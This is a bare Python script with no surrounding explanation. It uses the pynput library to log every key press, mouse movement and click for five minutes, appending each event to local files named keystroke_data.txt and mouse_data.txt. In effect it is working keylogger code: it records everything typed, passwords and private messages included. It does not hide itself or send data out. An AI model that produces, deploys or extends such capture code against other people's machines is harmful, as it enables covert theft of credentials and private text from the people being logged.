import time
from pynput import keyboard, mouse
keyboard_listener = keyboard.Listener()
mouse_listener = mouse.Listener()
def on_key_press(key):
    with open('keystroke_data.txt', 'a') as f:
        f.write(f'Key pressed: {key}\n')
def on_mouse_move(x, y):
    with open('mouse_data.txt', 'a') as f:
        f.write(f'Mouse moved to: ({x}, {y})\n')
def on_mouse_click(x, y, button, pressed):
    with open('mouse_data.txt', 'a') as f:
        f.write(f'Mouse {button} clicked at: ({x}, {y})\n')
keyboard_listener.on_press = on_key_press
mouse_listener.on_move = on_mouse_move
mouse_listener.on_click = on_mouse_click
keyboard_listener.start()
mouse_listener.start()
duration = 300
start_time = time.time()
while time.time() - start_time < duration:
      time.sleep(0.1) 
keyboard_listener.stop()
mouse_listener.stop()
